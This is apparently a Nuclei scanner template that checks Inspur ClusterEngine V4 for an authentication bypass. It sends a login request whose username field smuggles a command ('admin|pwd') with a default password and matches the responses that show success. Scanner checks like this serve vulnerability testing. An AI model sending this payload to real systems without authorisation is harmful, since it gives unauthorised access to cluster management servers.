id: inspur-clusterengine-default-login

info:
  name: Inspur Clusterengine V4 Any User Login
  author: ritikchaddha
  severity: high
  reference:
    - https://blog.csdn.net/qq_36197704/article/details/115665793
  tags: inspur,clusterengine,default

requests:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}

        op=login&username=admin|pwd&password=123456

    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:

      - type: word
        words:
          - "\"exitcode\":0"
        part: body

      - type: word
        words:
          - "username=admin|pwd"
        part: header
        condition: and

      - type: status
        status:
          - 200
